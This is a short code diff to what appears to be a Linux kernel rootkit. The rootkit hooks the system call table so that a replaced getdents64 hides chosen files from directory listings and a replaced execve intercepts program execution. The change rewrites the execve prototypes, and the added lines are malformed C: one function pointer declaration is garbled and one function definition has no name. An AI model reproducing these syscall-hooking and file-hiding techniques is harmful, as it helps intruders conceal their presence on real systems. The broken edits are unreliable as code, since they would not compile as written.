@@ -16,10 +16,10 @@ static unsigned long **hook_syscall_table(void);
 static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count);
 // Kernel system call
 asmlinkage long (*kernel_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
-asmlinkage long (*kernel_execve)(char * filename,char * argv[ ],char * envp[ ]);
+asmlinkage long (*kernel_execve)execve(const char *filename, char *const argv[], char *const envp[]);
 // Hooked system call
 asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
-asmlinkage long hooked_execve(char * filename,char * argv[ ],char * envp[ ]);
+asmlinkage long hooked_execve(const char *filename, char *const argv[], char *const envp[]);
 
 
 /*************** What file we gonna hide ********************/
@@ -110,7 +110,7 @@ asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user 
     return rv;
 }
 
-asmlinkage long hooked_execve(char * filename,char * argv[ ],char * envp[ ])
+asmlinkage long (const char *filename, char *const argv[], char *const envp[])
 {
     long rv;
     
